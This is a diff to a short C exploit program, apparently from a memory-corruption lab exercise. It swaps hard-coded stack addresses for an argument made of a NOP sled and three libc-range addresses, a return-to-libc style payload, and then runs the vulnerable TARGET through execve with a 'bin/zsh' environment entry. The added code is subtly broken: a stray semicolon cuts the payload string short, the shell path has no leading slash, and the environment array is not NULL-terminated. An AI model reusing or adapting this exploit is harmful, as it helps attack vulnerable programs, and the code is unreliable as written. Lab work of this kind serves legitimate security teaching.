@@ -10,24 +10,17 @@
 int main(void)
 {
   char *args[3];
-  char *env[1];
-
-  char buf[24];
-  printf("Buffer created\n");
-
-  uint32_t *addr_ptr = (uint32_t *)(buf);
-  
-  // Replace these with the correct offsets and addresses
-  *addr_ptr++ = 0xffffe420;
-  *addr_ptr++ = 0xffffcff0;
-  *addr_ptr++ = 0xffffcfe8;
-  printf("Buffer populated with addresses\n");
+  char *env[2];
 
   args[0] = TARGET;
-  args[1] = buf;
+  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90";
+            "\x60\x43\xe1\xf7"
+            "\xc0\x6e\xe0\xf7"
+            "\x63\xf3\xf5\xf7";
   args[2] = NULL;
 
   env[0] = NULL;
+  env[1] = "bin/zsh";
 
   printf("Calling execve with target: %s\n", TARGET);
   execve(TARGET, args, env);
